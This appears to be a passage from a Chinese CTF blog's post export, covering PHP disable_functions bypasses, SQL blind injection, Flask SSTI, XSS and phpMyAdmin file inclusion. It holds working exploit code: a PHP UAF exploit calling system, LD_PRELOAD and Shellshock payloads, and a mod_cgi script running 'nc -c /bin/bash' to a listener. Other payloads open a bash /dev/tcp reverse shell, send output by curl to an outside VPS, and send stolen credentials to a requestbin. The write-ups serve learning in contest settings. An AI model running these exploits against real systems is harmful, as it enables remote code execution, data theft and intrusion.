$text_size = $p_memsz; } } if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; } function get_basic_funcs($base, $elf) { list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i &lt; $data_size / 8; $i++) { $leak = leak($data_addr, $i * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) { $deref = leak($leak); # 'constant' constant check if($deref != 0x746e6174736e6f63) continue; } else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) { $deref = leak($leak); # 'bin2hex' constant check if($deref != 0x786568326e6962) continue; } else continue; return $data_addr + $i * 8; } } function get_binary_base($binary_leak) { $base = 0; $start = $binary_leak &amp; 0xfffffffffffff000; for($i = 0; $i &lt; 0x1000; $i++) { $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) { # ELF header return $addr; } } } function get_system($basic_funcs) { $addr = $basic_funcs; do { $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) { # system return leak($addr + 8); } $addr += 0x20; } while($f_entry != 0); return false; } function trigger_uaf($arg) { # str_shuffle prevents opcache string interning $arg = str_shuffle(str_repeat('A', 79)); $vuln = new Vuln(); $vuln-&gt;a = $arg; } if(stristr(PHP_OS, 'WIN')) { die('This PoC is for *nix systems only.'); } $n_alloc = 10; # increase this value if UAF fails $contiguous = []; for($i = 0; $i &lt; $n_alloc; $i++) $contiguous[] = str_shuffle(str_repeat('A', 79)); trigger_uaf('x'); $abc = $backtrace[1]['args'][0]; $helper = new Helper; $helper-&gt;b = function ($x) { }; if(strlen($abc) == 79 || strlen($abc) == 0) { die(\"UAF failed\"); } # leaks $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) { die(\"Couldn't determine binary base address\"); } if(!($elf = parse_elf($base))) { die(\"Couldn't parse ELF header\"); } if(!($basic_funcs = get_basic_funcs($base, $elf))) { die(\"Couldn't get basic_functions address\"); } if(!($zif_system = get_system($basic_funcs))) { die(\"Couldn't get zif_system address\"); } # fake closure object $fake_obj_offset = 0xd0; for($i = 0; $i &lt; 0x110; $i += 8) { write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); } # pwn write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); # internal func type write($abc, 0xd0 + 0x68, $zif_system); # internal func handler ($helper-&gt;b)($cmd); exit();}?&gt; 但是web目录没有上传权限…这时候发现web目录下存在sandbox文件夹，这里可以上传，nice！ 然后到浏览器访问/sandbox/bypass7x.php，但是一直不能访问… 但是我们有小马呢，用小马包含一下试试 ?cmd=include(\"sandbox/bypass7x.php\"); 发现成功执行： 然后我们那执行的命令改为/readflag，即可拿到flag： 这题的最后不得不说…搅屎真爽，不过有点可耻。 DAY 2剩下的题目都是高难度了，就出了半个题… nweb考察sql盲注+伪造mysql-server实现任意文件读取，这次是真心体会到，以后盲注脚本还是用ascii码吧，坚决不用字母表了… 题目分析进入题目，发现可以注册登录，登陆上之后flag页面访问无权限，在评论区看到了如下的提示： 猜测注册账户的时候可能存在问题，重新注册，抓包发现存在type参数，并且被置为0： 那这个参数应该就是与等级有关了，后来在注册页面看到提示： 再次抓包更改type=110，登录再次访问flag页，发现可以搜索flag了： 搜索的页面是search.php，注入点肯定就是在这个页面了，参数是flag，经过FUZZ发现，union被ban，select、from需要双写绕过，查看搜索的回显发现，语句错误反馈There is no flag，语句正确反馈There is flag!肯定是盲注了，拿上次I春秋战“疫”赛的盲注脚本改了一下： import requestsurl = 'http://121.37.179.47:1001/search.php'headers = {\"Cookie\": \"PHPSESSID=b2olm04l72i9v25s1orvb28253; username=8837cc3dd80b62a3b5bab3ff2dc91469\"}#payload = \"-1' or (ascii(mid((selselectect database()),{0},1))={1})#\"#payload = \"-1' or (ascii(mid((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database()),{0},1))={1})#\"#payload = \"-1' or (ascii(mid((selselectect group_concat(column_name) frfromom information_schema.columns where table_name='admin'),{0}，1))={1})#\"payload = \"-1' or (ascii(mid((selselectect * frfromom fl4g),{0},1))={1})#\"database = ''for i in range(1, 80): for n in range(30,127): #注意这里有时候导致效率很低 data = { \"flag\": payload.format(i, n), } req = requests.post(url, data=data,headers=headers) if \"There is flag\" in req.text: database += chr(n) print(database) break mysql不区分大小写，就是说如果a不存在，会用A去匹配a…写盲注脚本，如果用字母表的话，这就是个巨坑！还是用ascii码靠谱，不过ascii会匹配较多的字符，爆破速度有时候会很慢，可能因为很多字符请求让服务器500导致的…这一点跑脚本的时候改了半天…还是tcl 跑出库名：ctf-2表名：admin、fl4g、jd、user直接到fl4g表跑flag，跑了几次都没有跑出完整的flag： 后来经队友提示，flag可能是分开存放的，数据库可能只有部分flag。于是想到还有admin表可以去查管理员密码，用脚本跑出密码e2ecea8b80a96fb07f43a2f83c8b0960，md5解密一下得到whoamiadmin，拿去用admin/whoamiadmin登录却说用户名或密码错误…半天都不行…睡了睡了 DAY3醒来发现flag已经被队友交了，密码就是那个，应该是环境出问题了…那么再来学习一下。 管理员登录之后： 根据前半部分flag，想到是mysql蜜罐任意读取文件参考这里，参考github上大师傅写的脚本，放在VPS上监听，然后在浏览器填入VPS地址和端口，利用构造的mysql蜜罐进行任意文件读取flag.php，就能拿到完整的flag了。 赛题环境没了，暂时没法复现了，知道原理，回头再试吧。","link":"/2020/03/07/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"},{"title":"CTFHub-bypass_functions_disable","text":"不得不说，Line师傅们在技能树里安排的这个分支真是太棒了！作为一名菜鸡，之前只是对bypass functions_disable有比较少并且不清晰的理解，但是刷了这部分题相当于系统地学习了一遍，帮助很大！ 现在的web题中functions_disable很常见，很多时候都会苦于小马上传、蚁剑连上之后不能读flag文件内容、终端也执行不了命令…这个时候就肯定是进行了functions_disable，需要我们尝试各种姿势来bypass了。 通过这篇博客，好好记录一下各种绕过姿势的学习。 LD_PRELOAD主要考察利用Linux的环境变量LD_PRELOAD来进行functions_disable的bypass。 关于利用LD_PRELOAD bypass LD_PRELOAD是与载入函数库相关的环境变量,它的作用便是在程序运行前优先加载指定的函数库。 每个程序执行的时候会去动态链接库so文件里面找函数的位置，而我们的目的是让程序去执行我们自定义的动态链接库，这样就相当于在正常程序中进行function_disable禁用诸如system之前便执行了系统命令。 结合上述两点，我们就可以自定义一个so文件上传，然后再用一个php的脚本来激活并达到反弹shell的目的。 利用条件 1、支持putenv 2、支持mail、imap_mail、mb_send_mail或error_log 3、存在可写的目录，需要上传.so文件 bypass流程 1、在Linux下生成含有恶意代码的动态链接程序 2、通过php脚本利用putenv来设置LD_PRELOAD，使得优先调用我们构造的恶意动态链接程序 3、通过上述的php脚本触发恶意代码，以达到反弹shell的目的 首先，构造的动态链接程序的代码如下： #include &lt;stdlib.h&gt;__attribute__((constructor)) void Z2diMG4=(){ unsetenv(\"LD_PRELOAD\"); if (getenv(\"cmd\") != NULL){ system(getenv(\"cmd\")); } else{ system(\"echo 'Hello' &gt; /hackfile\"); }} 构造php触发脚本： 这里常用的有两种方式：Sendmail+LD_PRELOAD和error_log+LD_PRELOAD，如果服务端没有禁止mail的使用，就可以用前者，反之可以使用后者。 Sendmail+LD_PRELOAD：sendmail会调用geteuid()，因此可以进行劫持，详细知识参考这里。 触发脚本如下： &lt;?php putenv(\"cmd=ls &gt; hackfile\"); putenv(\"LD_PRELOAD=/tmp/hack.so\"); mail(\"\",\"\",\"\",\"\",\"\");?&gt; 将so文件传到/tmp文件夹是因为这个文件夹用户是可以进行写入的，自己也可以找别的文件夹来灵活构造。 error_log+LD_PRELOAD：当题目环境不支持mail的时候，即可利用error_log来触发劫持，本题就需要用这种方法。 触发脚本如下： &lt;?php putenv(\"cmd=ls &gt; hackfile\"); putenv(\"LD_PRELOAD=/tmp/hack.so\"); error_log(\"a\",1); mail(\"a@localhost\",\"\",\"\",\"\",\"\");?&gt; 另外当题目环境存在gnupg拓展的时候还可以利用php的gnupg_init()函数来触发，可以在phpinfo中看到，脚本如下： &lt;?php putenv(\"cmd=ls &gt; hackfile\"); putenv(\"LD_PRELOAD=/tmp/hack.so\"); gnupg_init();?&gt; 注意上面脚本中执行的命令是将ls执行的结果重定向到hackfile中来查看，当然也可以通过如下的代码来拿到shell： &lt;?php putenv(\"cmd=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/host/port 0&gt;&amp;1'\"); putenv(\"LD_PRELOAD=/tmp/hack.so\"); mail(\"\",\"\",\"\",\"\",\"\");?&gt; 解题进入题目，源码中给了部分源码： 源码中提示已经存在小马了，且秘钥是ant，直接拿到蚁剑里连接能连上，但是flag文件无法访问，开终端也无法执行命令： 肯定是system被ban了，需要进行functions_disable的bypass。 有两种方法：利用蚁剑自带的插件或者自己手工bypass 利用蚁剑插件 这个有要求：自己的环境必须是Linux的，因为它要用gcc去编译so文件。 这个要求满足之后便可以在插件市场中下载functions_disablebypass的插件，然后选择LD_PRELOAD进行bypass就行了。 这里有官方详解 手动bypass 首先利用前面提到的C代码，利用下面两条命令生成so文件： gcc -c -fPIC ld_preload.c -o ld_preloadgcc --share ld_preload -o ld_preload.so 同时用上述的代码构造好触发的php脚本： &lt;?php //putenv(\"cmd=ls &gt; hackfile\"); putenv(\"cmd=/readflag &gt; hackfile\"); putenv(\"LD_PRELOAD=/tmp/ld_preload.so\"); error_log(\"a\",1); mail(\"a@localhost\",\"\",\"\",\"\",\"\");?&gt; 把so文件上传到/tmp/文件夹下，触发脚本上传到/var/www/html/下 然后在浏览器访问我们写入的触发脚本，然后回到蚁剑查看效果： 可以看到hackfile文件已经存在了，打开即可拿到flag 关于这种bypass姿势，网上很多，以下几个写的全面一些：https://www.freebuf.com/articles/web/192052.htmlhttps://www.dazhuanlan.com/2020/01/06/5e128867c6c74/ ShellShock主要考察利用bash破壳漏洞来执行命令，进行functions_disable的bypass 关于利用ShellShock bypass 该姿势主要是借助了bash破壳（CVE-2014-6271）漏洞，直接导致我们可以利用mail()函数执行任意命令，绕过disable_functions。 利用条件 1、支持putenv 2、支持mail、imap_mail、mb_send_mail或error_log 3、/bin/bash 存在 CVE-2014-6271 漏洞 4、/bin/sh -&gt; /bin/bash sh 默认的 shell 是 bash bypass流程 1、编写shellshock利用脚本并上传 2、浏览器访问上传的脚本进行反弹shell 在网上找到了两版脚本代码： //蚁剑提供的&lt;?phpfunction runcmd($c){ $d = dirname($_SERVER[\"SCRIPT_FILENAME\"]); if(substr($d, 0, 1) == \"/\" &amp;&amp; function_exists('putenv') &amp;&amp; (function_exists('error_log') || function_exists('mail'))){ if(strstr(readlink(\"/bin/sh\"), \"bash\")!=FALSE){ $tmp=tempnam(sys_get_temp_dir(), 'as'); putenv(\"PHP_LOL=() { x; }; $c &gt;$tmp 2&gt;&amp;1\"); if (function_exists('error_log')) { error_log(\"a\", 1); }else{ mail(\"a@127.0.0.1\", \"\", \"\", \"-bv\"); } }else{ print(\"Not vuln (not bash)\\n\"); } $output = @file_get_contents($tmp); @unlink($tmp); if($output!=\"\"){ print($output); }else{ print(\"No output, or not vuln.\"); } }else{ print(\"不满足使用条件\"); }}// runcmd(\"whoami\"); // 要执行的命令runcmd($_REQUEST[\"cmd\"]); // ?cmd=whoami?&gt; 以及下面这个： &lt;?php # Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) # Google Dork: none # Date: 10/31/2014 # Exploit Author: Ryan King (Starfall) # Vendor Homepage: http://php.net # Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror # Version: 5.* (tested on 5.6.2) # Tested on: Debian 7 and CentOS 5 and 6 # CVE: CVE-2014-6271 function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283 $tmp = tempnam(\".\",\"data\"); putenv(\"PHP_LOL=() { x; }; $cmd &gt;$tmp 2&gt;&amp;1\"); // In Safe Mode, the user may only alter environment variableswhose names // begin with the prefixes supplied by this directive. // By default, users will only be able to set environment variablesthat // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, // PHP will let the user modify ANY environment variable! mail(\"a@127.0.0.1\",\"\",\"\",\"\",\"-bv\"); // -bv so we don't actuallysend any mail $output = @file_get_contents($tmp); @unlink($tmp); if($output != \"\") return $output; else return \"No output, or not vuln.\"; } echo shellshock($_REQUEST[\"cmd\"]); ?&gt; 然后通过蚁剑上传的web目录并访问，不出问题即可通过cmd传参执行命令。 解题进入题目还是那个页面： 上蚁剑，同样不能通过终端执行命令，查看一下phpinfo： 发现是PHP5+版本，因此可以利用shellshock进行bypass，两种方式：蚁剑插件 or 手工… 利用蚁剑插件参考这里。 手工bypass利用上述代码构造exp脚本，上传并访问，即可拿到shell，通过控制cmd参数内容来进行命令执行。 话说，我做这题的时候这样用没成功…后来用l3m0n师傅的脚本打通的… 这里提一下l3m0n师傅脚本中的FUZZ脚本(就是那个名为shell.php的脚本)，上传这个脚本到web文件夹下，访问即可FUZZ出可以利用的点： 然后借助了apache_mod_cgi的解题方式最终拿到的flag。 可参考：https://www.secpulse.com/archives/2300.html Apache Mod CGI主要考察利用apache mod_cgi模块结合.htaccess对functions_disable进行bypass 关于利用Apache_Mod_CGI bypass 在apache的WEB环境中，经常会使用.htaccess来确定某个目录下的URL重写规则，特别是一些开源的CMS或者框架当中经常会用到，比如著名的开源论坛discuz!，就可以通过.htaccess文件实现URL的静态化，大部分PHP框架，例如ThinkPHP和Laravel，在apache环境下会用.htaccess文件实现路由规则。但是如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令。 利用条件 1、Linux 操作系统 2、Apache +PHP (apache 使用apache_mod_php) 3、Apache 开启了 cgi, rewrite 4、Web 目录给了 AllowOverride 权限 bypass流程 1、phpinfo查看服务端的配置是否支持cgi 2、配置.htaccess文件并上传 3、上传反弹shell的文件 配置.htaccess文件如下(参考蚁剑给出的策略)： Options +ExecCGIAddHandler cgi-script .ant 反弹shell文件代码： #!/bin/shecho&amp;&amp;cd &quot;/var/www/html&quot;;ls -al;echo [S];pwd;echo [E]//注意是.ant后缀 最后访问shell.ant即可进行反弹shell。 这里也参考了l3m0n师傅github里关于bypass的脚本，详细完备，学到很多。 &lt;?php$cmd = \"nc -c '/bin/bash' 172.16.15.1 4444\"; //command to be executed$shellfile = \"#!/bin/bash\\n\"; //using a shellscript$shellfile .= \"echo -ne \\\"Content-Type: text/html\\\\n\\\\n\\\"\\n\"; //header is needed, otherwise a 500 error is thrown when there is output$shellfile .= \"$cmd\"; //executing $cmdfunction checkEnabled($text, $condition, $yes, $no) //this surely can be shorter{ echo \"$text: \" . ($condition ? $yes : $no) . \"&lt;br&gt;\\n\";}if (!isset($_GET['checked'])) { @file_put_contents('.htaccess', \"\\nSetEnv HTACCESS on\", FILE_APPEND); //Append it to a .htaccess file to see whether .htaccess is allowed header('Location: ' . $_SERVER['PHP_SELF'] . '?checked=true'); //execute the script again to see if the htaccess test worked} else { $modcgi = in_array('mod_cgi', apache_get_modules()); // mod_cgi enabled? $writable = is_writable('.'); //current dir writable? $htaccess = !empty($_SERVER['HTACCESS']); //htaccess enabled? checkEnabled(\"Mod-Cgi enabled\", $modcgi, \"Yes\", \"No\"); checkEnabled(\"Is writable\", $writable, \"Yes\", \"No\"); checkEnabled(\"htaccess working\", $htaccess, \"Yes\", \"No\"); if (!($modcgi &amp;&amp; $writable &amp;&amp; $htaccess)) { echo \"Error. All of the above must be true for the script to work!\"; //abort if not } else { checkEnabled(\"Backing up .htaccess\", copy(\".htaccess\", \".htaccess.bak\"), \"Suceeded! Saved in .htaccess.bak\", \"Failed!\"); //make a backup, cause you never know. checkEnabled(\"Write .htaccess file\", file_put_contents('.htaccess', \"Options +ExecCGI\\nAddHandler cgi-script .dizzle\"), \"Succeeded!\", \"Failed!\"); //.dizzle is a nice extension checkEnabled(\"Write shell file\", file_put_contents('shell.dizzle', $shellfile), \"Succeeded!\", \"Failed!\"); //write the file checkEnabled(\"Chmod 777\", chmod(\"shell.dizzle\", 0777), \"Succeeded!\", \"Failed!\"); //rwx echo \"Executing the script now. Check your listener &lt;img src = 'shell.dizzle' style = 'display:none;'&gt;\"; //call the script }}?&gt; 本题解题的时候就是用的这个脚本。 解题进入题目常规操作，蚁剑连接，注意连接的时候编码器需要选择base64。同样是终端输入命令无效。看一下phpinfo，可以发现，支持cgi，同时根据题目描述，利用cgi进行bypass，还是两种方式：蚁剑bypass插件 or 手工bypass。 利用蚁剑插件模式选择Apache_mod_cgi即可，详细参考这里。 手工bypass前面说了，这题用的l3m0n师傅的脚本，直接将exp.php(前面贴的代码)上传到web文件夹，并访问该文件，回显如下： 再看蚁剑里的情况： 可以发现，多了几个文件，其中shell.dizzle文件里包含我们要执行的命令，我们通过更改该文件即可拿到flag(这里注意：/flag是644权限，www-data用户无法通过读文件的形式读到内容, 需要执行拥有 SUID 权限的 tac 命令(具体看 /start.sh)来获取 flag)： 然后在浏览器访问shell.dizzle即可拿到flag了。 可参考：https://www.anquanke.com/post/id/195686 Json Serializer UAF利用Json序列化程序中的堆溢出进行bypass。 关于利用Json_Serializer_UAF bypass PHP-Json-bypass漏洞利用json序列化程序中的堆溢出触发，以绕过functions_disable并执行系统命令，影响范围是Linux，php 7.1-7.3。 利用条件 1、Linux 操作系统 2、PHP 版本：7.1 - all versions to date、7.2 &lt; 7.2.19 (released: 30 May 2019)、7.3 &lt; 7.3.6 (released: 30 May 2019) bypass流程 1、查看PHP版本 2、上传exp执行或者利用蚁剑插件bypass 这里附一个网上找到大师傅写的exp。我从师傅那里也fork了exp的库，可到我的github共同学习。 解题进入题目，仍然给了小马，连接上仍然没有权限。可以选择利用蚁剑插件或者上面的exp进行bypass拿到www-data的用户权限。（再提示一下：bypass插件只有Linux下的蚁剑可用哦） 利用蚁剑插件参考官方的wp，我们来实现一下。 连接上之后，在主页面选择绕过disable_functions插件： 然后选择Json Serializer UAF–&gt;开始bypass 之后就能拿到www-data权限的shell了，注意这个用户权限不足以读取flag，因此cat命令读取不到flag，需要用tac命令来读取： 手工bypassexp已经给了，自己可以尝试下，这两天事情多，几个题都是用蚁剑秒的。 参考：https://www.anquanke.com/post/id/195686#h3-4https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/6 PHP-FPM在服务器支持PHP-FPM的情况下，利用PHP的内核变量进行bypass，原理与利用LD-PRELOAD进行bypass是一样的。 关于利用PHP-FPM bypass Fastcgi 是一种通讯协议，用于Web服务器与后端语言的数据交换；PHP-FPM则是php环境中对Fastcgi协议的管理程序实现。 Nginx为fastcgi 提供了 fastcgi_param 来主要处理映射关系，将 Nginx 中的变量翻译成 PHP 能够理解的变量。 利用条件 1、PHP必须运行于PHP-FPM/FastCGI模式下 2、内核版本必须大于2.98 3、open_basedir = off bypass流程 1、查看phpinfo是否支持PHP-FPM/FastCGI 2、上蚁剑插件 or exp 解题进入题目，一如既往蚁剑连接，这个题其实与蚁剑原版有点出入，蚁剑题解里写的本题环境是支持putenv的，那就和利用LD_PRELOAD绕过姿势一样了，但是试了，没成功，后来用蚁剑插件的时候发现了问题。 利用蚁剑插件像前面的操作一样：选择上bypass插件 -&gt; 选择模式 -&gt; FPM/FCGI这个时候发现问题所在了： 可以看到，本题环境并没有putenv，用LD_PRELOAD的姿势能过就怪了… 然后在地址里选上最后一个并开始： 成功执行之后，连接上题目环境，再刷新一下web目录看一下： 发现多了一个.antproxy.php没错！这就是蚁剑写入的另一个shell文件，我们回去把连接shell的url换成这个shell文件的url，链接密码不变，例如： url：http://change-123456/shell.php，连接密码：cmd改为url：http://change-123456/.antproxy.php，连接密码：cmd 再次连接即可拿到拥有www-data权限的shell，注意此时cat命令还是读取不到flag的，需要用tac命令来拿到flag: 参考：https://www.freebuf.com/articles/web/82801.htmlhttps://www.anquanke.com/post/id/195686#h3-4 GC UAF利用GC UAF导致的PHP代码执行漏洞进行bypass 关于利用GC UAF PHP是一门托管型语言，在PHP编程中程序员不需要手工处理内存资源的分配与释放(使用C编写PHP或Zend扩展除外)，这就意味着PHP本身实现了垃圾回收机制(Garbage Collection)。 该机制存在UAF漏洞，利用该漏洞可以执行命令等，也可以完成对functions_disable的bypass 利用条件 PHP版本满足： 7.0 - all versions to date 7.1 - all versions to date 7.2 - all versions to date 7.3 - all versions to date bypass流程 1、查看PHP版本信息 2、利用蚁剑插件 or exp 解题进入题目，蚁剑连接，查看phpinfo发现满足要求，那么即可利用该方式进行bypass 利用蚁剑插件蚁剑连接之后，选择上bypass插件 -&gt; 选择模式 -&gt; GC UAF 然后点击开始，即可拿到www-data权限的shell，利用tac命令即可读到flag： 手工bypass可以利用这个exp进行 参考：https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/7https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass 持续更新。。。","link":"/2020/03/06/CTFHub-bypass-functions-disable/"},{"title":"GWCTF2019复现","text":"去年安恒决赛，同时还进行着GWCT，当时没做，现在复现复现💩 [GWCTF 2019]我有一个数据库考察[CVE-2018-12613]-PhpMyadmin后台文件包含漏洞，参考这里。 解题扫后台发现robots.txt和phpmyadmin两个页，进入phpmyadmin发现版本是4.8.1的，上面说到的漏洞刚好支持的是4.8.0和4.8.1，因此拿payload尝试一下，发现直接能打通： index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd 那么再构造payload拿flag就行了： index.php/?target=db_sql.php%253f/../../../../../../../../etc/passwd [GWCTF 2019]枯燥的抽奖考察php伪随机的漏洞：如果mt_srand()使用同一个seed，生成的随机数是可以爆破出seed的。 题目分析查看源码： $(\"#div1\").load(\"check.php #p1\");$(\".close\").click(function(){ $(\"#myAlert\").hide();}); 可以看到，存在check.php，访问该页面可以拿到如下源码： &lt;?php#这不是抽奖程序的源代码！不许看！header(\"Content-Type: text/html;charset=utf-8\");session_start();if(!isset($_SESSION['seed'])){$_SESSION['seed']=rand(0,999999999);}mt_srand($_SESSION['seed']);$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";$str='';$len1=20;for ( $i = 0; $i &lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); }$str_show = substr($str, 0, 10);echo \"&lt;p id='p1'&gt;\".$str_show.\"&lt;/p&gt;\";if(isset($_POST['num'])){ if($_POST['num']===$str){x echo \"&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}&lt;/p&gt;\"; } else{ echo \"&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;\"; }}show_source(\"check.php\"); 可以看到，存在mt_srand()，mt_rand()两个函数，并且session是用的随机数设置的，那么先将伪随机数转化为php_mt_seed可识别的数据： str1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'str2='VJozuuy4YQ'str3 = str1[::-1]length = len(str2)res=''for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' ' breakprint（res） 然后用php_mt_seed爆破伪随机数： 然后利用题目源码，构造POC： &lt;?phpmt_srand(980044562);$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";$str='';$len1=20;for ( $i = 0; $i &lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); }echo $str;?&gt; 把结果输入即可拿到flag [GWCTF 2019]你的名字考察flask的SSTI，以及利用curl反弹shell 题目分析进入题目是一个输入框，很容易想到是sql注入，但是试了好一会儿没有效果，抓包看返回头可以得知是python的后端，因此认定是SSTI。 用2进行测试时报错，猜想是双括号被ban了，后来用{}与%组合的方式可以，但是还有很多关键词被ban了，参考到一位师傅的题解，发现他认为后端的过滤是这么写的：(应该是FUZZ出来的吧) blacklist = ['import', 'getattr', 'os', 'class', 'subclasses', 'mro', 'request', 'args', 'eval', 'if', 'for', ' subprocess', 'file', 'open', 'popen', 'builtins', 'compile', 'execfile', 'from_pyfile', 'local', 'self', 'item', 'getitem', 'getattribute', 'func_globals', 'config']for no in blacklist: while True: if no in s: s = s.replace(no, '') else: breakreturn s 这种过滤，利用黑名单中最后一个词进行混淆来过滤是最好了，即if=&gt;iconfigf，因为是用黑名单的关键词按顺序来对输入进行替换的，那么最后一个config被替换之后，过滤也就结束了。 同时还要利用VPS来接收结果，在BUU中开了一台内网靶机，构造最终payload如下： #获取文件名{% iconfigf ''.__claconfigss__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.func_glconfigobals.lineconfigcache.oconfigs.popconfigen('curl http://174.0.231.221:1234/ -d `ls /`;') %}1{% endiconfigf %} #拿flag{% iconfigf ''.__claconfigss__.__mconfigro__[2].__subclasconfigses__()[59].__init__.func_glconfigobals.linecconfigache.oconfigs.popconfigen('curl http://174.0.231.221:1234/ -d `cat /flag_1s_Hera`;') %}1{% endiconfigf %} 成功打出flag： [GWCTF 2019]mypassword考察XSS 题目分析注册并登录之后，在feedback页面看到了一个大大的输入框，查看源码如下： if(is_array($feedback)){ echo \"&lt;script&gt;alert('反馈不合法');&lt;/script&gt;\"; return false;}$blacklist =['_','\\'','&amp;','\\\\','#','%','input','script','iframe','host','onload','onerror','srcdoc','location','svg','form','img','src','getElement','document','cookie'];foreach ($blacklist as $val) { while(true){ if(stripos($feedback,$val) !== false){ $feedback = str_ireplace($val,\"\",$feedback); } else{ break; } }} 通过观察黑名单中的内容，又是一个大大的输入框，指定是XSS了，参考别的师傅的题解讲到本题存在CSP，不能注入外部的JS，那肯定就需要在内部JS上动手脚，逐个页面看源码，结果在登陆页面看到存在login.js，源码如下： if (document.cookie &amp;&amp; document.cookie != '') { var cookies = document.cookie.split('; '); var cookie = {}; for (var i = 0; i &lt; cookies.length; i++) { var arr = cookies[i].split('='); var key = arr[0]; cookie[key] = arr[1]; } if(typeof(cookie['user']) != \"undefined\" &amp;&amp; typeof(cookie['psw']) != \"undefined\"){ document.getElementsByName(\"username\")[0].value = cookie['user']; document.getElementsByName(\"password\")[0].value = cookie['psw']; }} 这里记住密码功能会从Cookie中取出用户名和密码并赋值给username和password，因此我们可以利用这个内部JS来构造payload进行XSS，这里我们可以用BUU的requestbin来接受反馈。 在feedback页面构造如下payload提交： &lt;inpcookieut type=\"text\" name=\"username\"&gt;&lt;/inpcookieut&gt;&lt;inpcookieut type=\"text\" name=\"password\"&gt;&lt;/inpcookieut&gt;&lt;scricookiept scookierc=\"./js/login.js\"&gt;&lt;/scricookiept&gt;&lt;scricookiept&gt; var uname = documcookieent.getElemcookieentsByName(\"username\")[0].value; var passwd = documcookieent.getElemcookieentsByName(\"password\")[0].value; var res = uname + \" \" + passwd; documcookieent.locacookietion=\"http://http.requestbin.buuoj.cn/?a=\"+res;&lt;/scricookiept&gt; 等一段时间之后，即可在requestbin看到回显：","link":"/2020/03/04/GWCTF2019%E5%A4%8D%E7%8E%B0/"},{"title":"CTFHub部分记录","text":"技能树里几道学到新知识的题目的记录，还不错还不错😎 技能树-web-00截断这一题考察00截断，但是不是单纯地在文件名后缀处截断，那种方法只能绕过前端，但是本题后端还会有检测，因此需要构造绕过后端检测的截断。看到群里有些师傅问一些爆破文件名之类问题…感觉还是写一下题解吧，希望能有帮助，自己也记录一下。（为了写题解，又花30金币…LinE师傅求报销啊） 题目分析拿到题目先看看源码： if (!empty($_POST['submit'])) { $name = basename($_FILES['file']['name']); $info = pathinfo($name); $ext = $info['extension']; $whitelist = array(\"jpg\", \"png\", \"gif\"); if (in_array($ext, $whitelist)) { $des = $_GET['road'] . \"/\" . rand(10, 99) . date(\"YmdHis\") . \".\" . $ext; if (move_uploaded_file($_FILES['file']['tmp_name'], $des)) { echo \"&lt;script&gt;alert('上传成功')&lt;/script&gt;\"; } else { echo \"&lt;script&gt;alert('上传失败')&lt;/script&gt;\"; } } else { echo \"文件类型不匹配\"; }} 通过审计可知，代码的逻辑如下： 1、首先取到上传文件的扩展名$ext 2、将扩展名与白名单进行匹配，为jpg、png或gif才能通过第一次过滤 3、扩展名匹配之后，为上传的文件构造了一个新的存储路径$des，这个地方用了rand()函数，就看到有些师傅问是不是要爆破…看到后面的$ext怎么能想着爆破呢？这是正常上传图片的存储路径，人家后缀都是通过匹配的$ext，自己的小马肯定是php啊… 这题是考察00截断的，突破点也很明显了：构造$des的时候，首先取的是road参数的内容/var/www/html/upload/，想到看到的绕过后端检测的一篇文章，需要在存储路径的地方构造截断：/var/www/html/upload/shell.php%00。这里注意一下：存储路径后面要加一个php后缀的文件名，然后利用%00进行截断，这样上传文件的内容就存到了shell.php里，还要注意要用%00截断，由于内容在请求头中，直接在hex中改00会报bad request。 解题抓包改包如下：成功上传，蚁剑连接url/var/www/html/upload/shell.php即可。 命令注入-综合一个考察点比较全面，但是也是比较入门的题目。主要考察了对连接符、特殊文件名、读取文件命令等过滤的绕过。这个题解题的时候走了一大圈弯路，并且还撞到了墙上，后来用正常姿势解了出来… 题目分析既然比较综合，先看看源码： &lt;?php$res = FALSE;if (isset($_GET['ip']) &amp;&amp; $_GET['ip']) { $ip = $_GET['ip']; $m = []; if (!preg_match_all(\"/(\\||&amp;|;| |\\/|cat|flag|ctfhub)/\", $ip, 